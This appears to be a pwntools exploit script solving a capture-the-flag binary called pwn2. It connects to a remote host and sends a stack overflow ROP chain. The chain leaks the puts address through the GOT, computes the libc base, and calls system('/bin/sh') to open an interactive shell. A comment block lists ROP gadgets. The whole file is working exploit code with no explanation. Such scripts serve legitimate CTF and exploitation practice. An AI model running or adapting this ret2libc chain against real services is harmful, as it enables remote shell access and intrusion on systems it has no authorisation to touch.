from pwn import *
# context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./pwn2")
elf=ELF("./pwn2")
io=remote("1.14.71.254",28295)
libc=ELF("./libc-2.27.so")

puts_plt=elf.plt[b"puts"]
puts_got=elf.got[b"puts"]
pop_rdi_addr=0x400c83
start_addr=0x400790
ret_addr=0x4006b9

io.sendline(b'1')
payload=b'\x00'+cyclic(0x57)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
# gdb.attach(io)
# pause()

io.sendline(payload)
puts_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_addr-libc.sym[b"puts"]



print("puts_got: "+hex(puts_got))
print("puts_addr: "+hex(puts_addr))
print("puts_offset: "+hex(libc.sym[b"puts"]))
print("str_bin_sh: "+hex(next(libc.search(b"/bin/sh"))))
print("libc_base: ",hex(libc_base))

sys_addr=libc_base+libc.sym[b"system"]
bin_addr=libc_base+next(libc.search(b"/bin/sh"))
io.sendline(b'1')
payload=b'\x00'+cyclic(0x57)+p64(ret_addr)+p64(pop_rdi_addr)+p64(bin_addr)+p64(sys_addr)
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c80 : pop r14 ; pop r15 ; ret
# 0x0000000000400c82 : pop r15 ; ret
# 0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004007f0 : pop rbp ; ret
# 0x0000000000400aec : pop rbx ; pop rbp ; ret
# 0x0000000000400c83 : pop rdi ; ret
# 0x0000000000400c81 : pop rsi ; pop r15 ; ret
# 0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004006b9 : ret
# 0x00000000004008ca : ret 0x2017
# 0x0000000000400962 : ret 0x458b
# 0x00000000004009c5 : ret 0xbf02

# Unique gadgets found: 15